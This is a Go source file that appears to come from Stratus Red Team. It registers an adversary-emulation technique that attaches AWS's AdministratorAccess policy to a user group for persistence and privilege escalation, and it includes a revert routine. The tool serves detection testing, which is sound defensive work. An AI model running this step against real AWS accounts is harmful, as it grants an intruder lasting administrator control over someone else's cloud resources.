package aws

import (
	"context"
	_ "embed"
	"fmt"
	"log"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

var groupName = aws.String("group1")
var adminPolicyArn = aws.String("arn:aws:iam::aws:policy/AdministratorAccess")

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                         "aws.persistence.custom-privileged-group",
		FriendlyName:               "Create a user and a group. Put user inside the group and attach admin privileges to group",
		Description:                ``,
		Detection:                  ``,
		Platform:                   stratus.AWS,
		IsIdempotent:               false, // cannot create a login profile twice on the same user
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
	groupName := params["group_name"]

	log.Println("Attaching an administrative IAM policy to the malicious user group")
	_, err := iamClient.AttachGroupPolicy(context.Background(), &iam.AttachGroupPolicyInput{
		GroupName: &groupName,
		PolicyArn: adminPolicyArn,
	})
	if err != nil {
		return err
	}

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
	userName := params["user_name"]

	log.Println("Detaching administrative policy")
	_, err := iamClient.DetachGroupPolicy(context.Background(), &iam.DetachGroupPolicyInput{
		GroupName: groupName,
		PolicyArn: adminPolicyArn,
	})
	if err != nil {
		return err
	}

	_, err = iamClient.RemoveUserFromGroup(context.Background(), &iam.RemoveUserFromGroupInput{
		GroupName: groupName,
		UserName:  aws.String(userName),
	})
	if err != nil {
		fmt.Println("Error removing user from group:", err)
		return nil
	}

	log.Println("Removing IAM user group")
	_, err = iamClient.DeleteGroup(context.Background(), &iam.DeleteGroupInput{GroupName: groupName})
	return err
}
